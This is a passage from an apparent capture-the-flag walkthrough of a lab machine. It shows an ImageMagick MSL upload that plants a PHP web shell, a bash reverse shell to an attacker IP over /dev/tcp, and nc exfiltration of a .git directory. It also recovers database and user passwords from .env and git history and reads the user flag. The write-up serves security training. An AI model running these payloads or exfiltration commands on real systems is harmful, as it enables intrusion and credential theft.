token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vMTAuMTAuMTEuMjIwL2FwaS92Mi9hdXRoL2xvZ2luIiwiaWF0IjoxNzU3NjQ0NzgyLCJleHAiOjE3NTc2NjYzODIsIm5iZiI6MTc1NzY0NDc4MiwianRpIjoiaXE2TDFFM1VLYWRSZ2hIUiIsInN1YiI6IjEiLCJwcnYiOiIyM2JkNWM4OTQ5ZjYwMGFkYjM5ZTcwMWM0MDA4NzJkYjdhNTk3NmY3In0.UtM0OuBZAUue_rg5W-78B_bdKIXJOUt5rrHZGb8J6ys
Priority: u=0

--------------------------abcd
Content-Disposition: form-data; name="file"; filename="test.msl"
Content-Type: application/octet-stream

<?xml version="1.0" encoding="UTF-8"?>
<image>
<read filename="caption:&lt;?php system($_REQUEST['cmd']); ?&gt;" />
<write filename="info:/var/www/html/intentions/storage/app/public/rev.php" />
</image>
--------------------------abcd
```
note have to change the content-type:` multipart/form-data; boundary=------------------------abcd` or to whatever u put...

now we can curl:
```
curl http://10.10.11.220/storage/rev.php?cmd=whoami
caption:www-data
 CAPTION 120x120 120x120+0+0 16-bit sRGB 1.710u 0:02.252
```

to get rev shell send bash command thru curl:
`curl "http://10.10.11.220/storage/rev.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.4/4444+0>%261'"`
fyi i was getting file not found so i just ran same request thru burpsuite...

`www-data@intentions:~/html/intentions/storage/app/public$ `

im in!

 i start looking thru file i find this here:
 ```
 /html/intentions$ ls -la
ls -la
total 820
drwxr-xr-x  14 root     root       4096 Feb  2  2023 .
drwxr-xr-x   3 root     root       4096 Feb  2  2023 ..
-rw-r--r--   1 root     root       1068 Feb  2  2023 .env
drwxr-xr-x   8 root     root       4096 Feb  3  2023 .git
 ```
```
cat .env

DB_USERNAME=laravel
DB_PASSWORD=02mDWOgsOga03G385!!3Plcx
```

also i will send .git back to my machine as i cant see the logs when running git log.. perm denied:
```
tar -cf /tmp/git.tar ./.git
```

run this on my kali:
```
nc -lnvp 443 > git.tar
```

then on target:
```
 cat /tmp/git.tar | nc 10.10.14.4 443
```

now
```
tar xf git.tar
```

cd in .git now:
```
git log

git show 36b4287cf2fb356d868e71dc1ac90fc8fa99d319
....

{
+    public static function getToken($test, $admin = false) {
+        if($admin) {
+            $res = $test->postJson('/api/v1/auth/login', ['email' => 'greg@intentions.htb', 'password' => 'Gr3g1sTh3B3stDev3l0per!1998!']);
+            return $res->headers->get('Authorization');
+        } 
+        else {
+            $res = $test->postJson('/api/v1/auth/login', ['email' => 'greg_user@intentions.htb', 'password' => 'Gr3g1sTh3B3stDev3l0per!1998!']);
+            return $res->headers->get('Authorization');
+        }
+    }
+}
```

we now have gregs password!

in shell can run `su greg`
password: `Gr3g1sTh3B3stDev3l0per!1998!`

```
cd /home/greg
cat user.txt
3e1d3182793a7399ad8e158ea1e47394
```